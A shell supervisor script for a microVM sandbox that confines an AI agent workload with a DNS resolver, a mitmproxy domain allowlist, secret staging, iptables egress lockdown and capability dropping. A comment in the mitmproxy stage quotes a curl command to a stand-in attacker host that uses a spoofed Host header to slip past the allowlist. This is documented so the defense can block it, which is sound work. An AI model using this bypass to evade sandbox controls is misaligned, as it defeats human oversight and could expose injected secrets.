#!/bin/sh
# agentcage-apple-container supervisor — runs as PID 1 of the cage microVM.
#
# Stages (run in order; failure of any stage exits the microVM with a
# distinct exit code so failures are diagnosable from `container logs`):
#
#   10. Remount /proc with hidepid=2  → cage cannot enumerate other UIDs' PIDs
#   20. Resolve cage CMD              → read /etc/agentcage/cage-cmd.json,
#                                        shell-quote via jq @sh
#   30. Start dnsmasq (uid 201)       → recursive resolver forwarding to
#                                        1.1.1.1/8.8.8.8 (see dnsmasq.conf).
#                                        cage→dnsmasq is the only way to do
#                                        DNS from inside the cage.
#   40. Start mitmproxy (uid 200)     → transparent egress filter listening
#                                        on 127.0.0.1:8080 (handles both
#                                        HTTP and HTTPS via SNI sniffing,
#                                        single port). iptables in stage 80
#                                        REDIRECTs the cage's tcp/80 and
#                                        tcp/443 to it. Domain allowlist is
#                                        enforced by allowlist_addon.py
#                                        (rendered from cage.yaml's
#                                        `domains.allow`); non-listed hosts
#                                        get a 403 from the proxy itself.
#   50. Wait for mitmproxy ready      → poll CA cert AND listening port. If
#                                        we skip the port check, iptables in
#                                        stage 80 would REDIRECT cage traffic
#                                        to a closed socket → cage sees
#                                        "connection refused" with no clue.
#   60. Install CA in cage trust      → update-ca-certificates so cage HTTPS
#                                        clients trust the proxy's MITM cert.
#   70. Configure /etc/resolv.conf    → cage DNS queries hit local dnsmasq.
#   80. iptables egress lockdown      → DROP all cage egress except (a) to
#                                        the dnsmasq + mitmproxy ports on
#                                        loopback, (b) the REDIRECT of
#                                        tcp/80+tcp/443 to mitmproxy. uid 200
#                                        and uid 201 (proxy/dns themselves)
#                                        are allowed out. IPv6 is killed at
#                                        netfilter + sysctl so AAAA records
#                                        cannot bypass the v4-only NAT.
#   90. Drop caps, switch user, exec  → capsh sets NO_NEW_PRIVS, drops the
#                                        bounding set, setuid to cage (uid
#                                        1000), exec the cage CMD.
#
# This script runs with CAP_SYS_ADMIN + CAP_NET_ADMIN granted at container
# run time (see backends/apple_container.py). Both are gone by the time the
# cage workload starts.
#
# Security-critical code. Changes require /codex review per issue #120.

set -eu

log() { printf '[supervisor] %s\n' "$*" >&2; }
die() { log "FATAL: $1"; exit "${2:-99}"; }

#-- 10. hidepid=2 on /proc -------------------------------------------------
log "stage 10: remounting /proc with hidepid=2"
mount -o remount,hidepid=2 /proc \
  || die "cannot remount /proc with hidepid=2 — is --cap-add CAP_SYS_ADMIN set?" 10

#-- 20. Resolve cage CMD ---------------------------------------------------
CMD_FILE=/etc/agentcage/cage-cmd.json
[ -f "${CMD_FILE}" ] || die "${CMD_FILE} not found" 20
command -v jq >/dev/null 2>&1 || die "jq not found" 21
CMD_LINE=$(jq -r '@sh' < "${CMD_FILE}") || die "cannot parse ${CMD_FILE}" 22
log "stage 20: cage CMD = ${CMD_LINE}"

#-- 30. Start dnsmasq ------------------------------------------------------
log "stage 30: starting dnsmasq (uid 201)"
# /var/log/agentcage is bind-mounted from the host via virtiofs when the
# backend is configured to expose logs (apple-container's `start()` always
# passes --volume <host>:/var/log/agentcage). virtiofs preserves host
# ownership inside the guest and rejects chown/chmod on the mountpoint
# itself; we don't need (and can't have) per-component ownership of the
# top-level dir. Permissions are set host-side to 1777 so any uid in the
# microVM can create files. Plain `mkdir -p` is a no-op when the mount
# is present (and falls back to a regular dir for pre-bindmount cages).
mkdir -p /var/log/agentcage
chown acdns:acdns /var/log/agentcage 2>/dev/null || true
dnsmasq \
  --conf-file=/etc/agentcage/dnsmasq.conf \
  --user=acdns \
  --keep-in-foreground \
  --log-facility=/var/log/agentcage/dnsmasq.log \
  &
# Wait up to 5s for dnsmasq to actually bind 127.0.0.1:53 — `kill -0 PID`
# after a 1s sleep is racy (dnsmasq could die at second 1.5).
i=0
while [ "$i" -lt 5 ]; do
  if ss -lnu 2>/dev/null | grep -q '127.0.0.1:53'; then break; fi
  sleep 1; i=$((i+1))
done
ss -lnu 2>/dev/null | grep -q '127.0.0.1:53' \
  || die "dnsmasq did not bind 127.0.0.1:53; see /var/log/agentcage/dnsmasq.log" 30

#-- 35. Re-stage proxy secrets for uid 200 --------------------------------
# Apple-container's hardened secret model (0.21.x+): the backend writes
# each secret_injection rule's resolved value to a host-side file and
# bind-mounts the dir read-only at /run/agentcage/secrets. virtiofs
# maps the host owner to root inside the cage, so /run/agentcage/secrets
# is root-owned-mode-0600 here. mitmproxy runs as uid 200 and can't read
# it directly — supervisor (PID 1, root) re-stages each file into
# /home/acproxy/secrets/<env> with chown 200:200 mode 0400. The cage
# workload (uid 1000) never sees either path: /run/agentcage/secrets is
# root-only-readable (so uid 1000 can't even open it) and
# /home/acproxy/secrets is acproxy-only-readable.
#
# Idempotent: if no secrets dir is bind-mounted (cage has no
# secret_injection rules, or backend predates this), the loop is empty.
if [ -d /run/agentcage/secrets ]; then
  log "stage 35: re-staging proxy secrets for uid 200"
  mkdir -p /home/acproxy/secrets
  chown acproxy:acproxy /home/acproxy/secrets
  chmod 0700 /home/acproxy/secrets
  # Copy each file individually so we can chown/chmod each one. `cp -p`
  # would preserve host-side perms which we don't want.
  for f in /run/agentcage/secrets/*; do
    [ -f "$f" ] || continue
    dest="/home/acproxy/secrets/$(basename "$f")"
    cp "$f" "$dest"
    chown acproxy:acproxy "$dest"
    chmod 0400 "$dest"
  done
  # Unmount the host bind mount so the cage workload (uid 1000) can't
  # read it. virtiofs maps host file ownership through identity so the
  # host-side mode 0600 file shows up readable to whatever uid the
  # cage workload is running as. The only privilege-correct way to
  # hide it from the workload is to remove the mount from the shared
  # mount namespace before the workload starts. Requires CAP_SYS_ADMIN
  # which the supervisor still has until stage 90.
  umount /run/agentcage/secrets 2>/dev/null \
    || die "could not unmount /run/agentcage/secrets after staging — would leak secrets to cage workload" 35
  rmdir /run/agentcage/secrets 2>/dev/null || true
fi

#-- 40. Start mitmproxy ----------------------------------------------------
log "stage 40: starting mitmproxy (uid 200)"
# Chown the mitmproxy home + log dir BEFORE starting mitmproxy so the
# ownership state is final before any file the proxy writes lands here.
# See stage 30 for the virtiofs note on /var/log/agentcage (chown there
# is best-effort).
mkdir -p /home/acproxy/.mitmproxy /var/log/agentcage
chown acproxy:acproxy /home/acproxy /home/acproxy/.mitmproxy
chown acproxy:acproxy /var/log/agentcage 2>/dev/null || true

# The mitmproxy addon (/opt/agentcage/allowlist_addon.py) reads
# /etc/agentcage/allowlist.txt and 403s non-listed hosts from the proxy
# itself — the upstream connection is never opened. With
# `--set keep_host_header=true` set below, mitmproxy's
# `flow.request.pretty_host` reads the CLIENT-SENT HTTP Host header,
# which is fully attacker-controlled by the cage workload (a cage can
# `curl https://attacker-ip/ -H 'Host: api.anthropic.com'` and have
# pretty_host report `api.anthropic.com` while the bytes go to
# attacker-ip via SO_ORIGINAL_DST). The addon must NOT gate the
# allowlist or secret injection on pretty_host: it derives an
# authoritative host from `flow.client_conn.sni` (the TLS handshake)
# with fallback to `flow.request.host` (the SO_ORIGINAL_DST IP), and
# additionally blocks any request whose Host header disagrees with the
# authoritative host. See `_authoritative_host` and
# `_host_header_matches_authoritative` in allowlist_addon.py. This is
# what restores the "Host header cannot bypass the allowlist or
# unmask a secret" invariant under `keep_host_header=true`.
su -s /bin/sh -c '
  cd /home/acproxy
  HOME=/home/acproxy /opt/agentcage/mitmproxy/mitmdump \
    -s /opt/agentcage/allowlist_addon.py \
    --mode transparent \
    --listen-host 127.0.0.1 --listen-port 8080 \
    --set connection_strategy=lazy \
    --set keep_host_header=true \
    --set flow_detail=0 \
    --set termlog_verbosity=info \
    >> /var/log/agentcage/proxy.log 2>&1 &
' acproxy

#-- 50. Wait for mitmproxy CA + listening port -----------------------------
log "stage 50: waiting for mitmproxy CA cert AND listening port (max 20s)"
CA_PATH=/home/acproxy/.mitmproxy/mitmproxy-ca-cert.pem
i=0
while [ "$i" -lt 20 ]; do
  if [ -s "${CA_PATH}" ] && ss -lnt 2>/dev/null | grep -q '127.0.0.1:8080'; then
    break
  fi
  sleep 1; i=$((i+1))
done
[ -s "${CA_PATH}" ] || die "mitmproxy CA cert never appeared; see /var/log/agentcage/proxy.log" 50
ss -lnt 2>/dev/null | grep -q '127.0.0.1:8080' \
  || die "mitmproxy listener never came up on 127.0.0.1:8080; see /var/log/agentcage/proxy.log" 51
log "stage 50: mitmproxy ready (CA at ${CA_PATH}, listening on :8080)"

#-- 60. Install CA cert into cage trust store ------------------------------
log "stage 60: installing CA into cage trust store"
cp "${CA_PATH}" /usr/local/share/ca-certificates/agentcage-proxy.crt
update-ca-certificates --fresh >/dev/null 2>&1 \
  || log "WARN: update-ca-certificates failed; HTTPS clients may not trust the proxy"

# Mirror the proxy CA into /certs/ so backend-agnostic cage.yaml commands
# (the container backend bind-mounts the certs volume there) Just Work.
mkdir -p /certs
cp "${CA_PATH}" /certs/mitmproxy-ca-cert.pem

#-- 70. Cage DNS -----------------------------------------------------------
log "stage 70: pointing /etc/resolv.conf at local dnsmasq"
# This overrides whatever the user image set for /etc/resolv.conf. A user
# image with a special resolver setup will get clobbered — acceptable for
# v1 because the cage's only legal DNS path goes through dnsmasq anyway.
printf 'nameserver 127.0.0.1\n' > /etc/resolv.conf

#-- 80. iptables egress lockdown ------------------------------------------
log "stage 80: applying iptables egress rules"
# Kill IPv6 entirely IF the v6 stack exists in the microVM. dnsmasq
# returns AAAA records (forwarded from upstream); without the v6 lockdown
# the cage's curl would pick a v6 address first, bypassing our v4-only
# NAT REDIRECT. We require both ip6tables AND the sysctl to succeed when
# v6 is present so a kernel-side regression is loud, not silent.
if [ -e /proc/sys/net/ipv6/conf/all/disable_ipv6 ]; then
  ip6tables -P INPUT DROP   || die "ip6tables INPUT DROP failed" 80
  ip6tables -P OUTPUT DROP  || die "ip6tables OUTPUT DROP failed" 80
  ip6tables -P FORWARD DROP || die "ip6tables FORWARD DROP failed" 80
  sysctl -w net.ipv6.conf.all.disable_ipv6=1     >/dev/null \
    || die "sysctl ipv6 all disable failed" 80
  sysctl -w net.ipv6.conf.default.disable_ipv6=1 >/dev/null \
    || die "sysctl ipv6 default disable failed" 80
fi

# Default deny on OUTPUT. Every allowed path below must be explicit.
iptables -P OUTPUT DROP

# Allow established/related so responses come back in.
iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Egress to tcp/80 and tcp/443 → REDIRECT to local mitmproxy on 8080
# (transparent mode handles both HTTP and HTTPS on one port). The match
# excludes the proxy (uid 200) and dnsmasq (uid 201) so their upstream
# connections aren't redirected back to themselves; every OTHER uid in
# the container — the cage workload at uid 1000 AND root (uid 0), which
# is what `container exec` enters as because the image's default USER on
# most bases is root — gets redirected. Without root in the redirect,
# `agentcage cage exec ubuntu02 -- apt-get update` skips the proxy and
# falls straight to the default-DROP filter chain (timeouts on every
# upstream connection).
iptables -t nat -A OUTPUT -p tcp --dport 80 \
    -m owner ! --uid-owner 200 -m owner ! --uid-owner 201 \
    -j REDIRECT --to-ports 8080
iptables -t nat -A OUTPUT -p tcp --dport 443 \
    -m owner ! --uid-owner 200 -m owner ! --uid-owner 201 \
    -j REDIRECT --to-ports 8080

# Loopback access is allowed PER PORT, not blanket `-o lo -j ACCEPT`. The
# catch-all would let the cage reach any loopback service a user image
# happens to bind (debug endpoints, status servers, future mitmproxy UI
# ports). Restrict to the only two services the cage needs to reach.
#   - 127.0.0.1:8080 → mitmproxy (post-REDIRECT)
#   - 127.0.0.1:53   → dnsmasq (DNS, both UDP and TCP)
iptables -A OUTPUT -p tcp -d 127.0.0.1 --dport 8080 -j ACCEPT
iptables -A OUTPUT -p udp -d 127.0.0.1 --dport 53 -j ACCEPT
iptables -A OUTPUT -p tcp -d 127.0.0.1 --dport 53 -j ACCEPT

# Protocol relays (IMAP, SMTP) listen on cage-author-chosen ports inside
# the same mitmproxy process (uid 200). The cage workload reaches them
# over loopback — without an explicit ACCEPT per relay port the default
# DROP policy would silently kill cage→relay connections. The relay
# listens on whatever ``listen:`` says in cage.yaml; we read the JSON
# the wrapper baked into the image and open one loopback ACCEPT per
# unique destination port. jq is already required for stage 20.
if [ -f /etc/agentcage/protocol_relays.json ]; then
  RELAY_PORTS=$(jq -r '
    .[]
    | .listen // ""
    | split(":")
    | .[-1]
    | select(test("^[0-9]+$"))
  ' /etc/agentcage/protocol_relays.json 2>/dev/null \
    | sort -u || true)
  for port in ${RELAY_PORTS}; do
    log "stage 80: allowing loopback access on protocol_relay port ${port}"
    iptables -A OUTPUT -p tcp -d 127.0.0.1 --dport "${port}" -j ACCEPT \
      || die "iptables protocol_relay loopback rule failed (port ${port})" 82
  done
fi
# mitmproxy ↔ self (the addon talks to mitmproxy's own internals) and
# dnsmasq ↔ self need full loopback; uid-owner ACCEPT rules below cover
# that path because both run as their respective per-component uids.

# Proxy and dns themselves need internet egress. The cage runs as 1000;
# owner-uid match lets us allow proxy/dns out while locking the cage in.
iptables -A OUTPUT -m owner --uid-owner 200 -j ACCEPT
iptables -A OUTPUT -m owner --uid-owner 201 -j ACCEPT

#-- 90. Drop caps + exec cage workload ------------------------------------
# Resolve the name of the uid-1000 user in the image. The wrapper
# Containerfile creates `cage` only when the user image doesn't already
# have a uid-1000 entry — bases like ubuntu (`ubuntu`), node (`node`),
# and claude-code (`claude`) keep their own name. capsh's `--user=` flag
# resolves by NAME (it calls getpwnam internally to get uid/gid/home),
# so a hard-coded `--user=cage` blows up on those images with
# "User [cage] not known" and the cage exits before any workload runs.
CAGE_USER=$(getent passwd 1000 | cut -d: -f1)
[ -n "${CAGE_USER}" ] \
  || die "no user at uid 1000 in cage image — wrapper Containerfile should have created one" 89
log "stage 90: dropping caps, switching to cage user '${CAGE_USER}' (uid 1000)"
# capsh argv (order matters — flags are processed left to right):
#   --no-new-privs  → set NO_NEW_PRIVS prctl. Sticks across execve; blocks
#                     cage's children from gaining caps via setuid/setcap
#                     binaries.
#   --drop=all      → empty the bounding set BEFORE the user switch. With
#                     NoNewPrivs set this is defense-in-depth (the kernel
#                     already refuses to grant file caps under NNP), but
#                     guarantees the cage cannot acquire any capability
#                     even if NNP enforcement regresses or future code
#                     adds a privileged path we haven't considered.
#   --user=$CAGE_USER → setuid+setgid+initgroups to the uid-1000 user. The
#                     uid 0→1000 transition clears CapEff/CapPrm/CapInh.
#                     CapBnd is already empty from --drop=all above.
# Readiness marker — the LAST thing supervisor does before handoff. The
# host-side `AppleContainerBackend.start()` polls for this file on the
# virtiofs-shared /var/log/agentcage mount, so it can return only after
# every stage (proxy listening, iptables NAT, secrets staged) has
# completed. Without this, the next `container exec` (or `agentcage run`
# claude-code) races the supervisor and sees missing /home/acproxy/secrets,
# no proxy on 127.0.0.1:8080, or no iptables NAT — leading to "Invalid
# API key" / placeholder-leaks-to-upstream symptoms. See issue #168.
touch /var/log/agentcage/ready

exec capsh \
  --no-new-privs \
  --drop=all \
  --user="${CAGE_USER}" \
  --shell=/bin/sh \
  -- -c "exec ${CMD_LINE}"
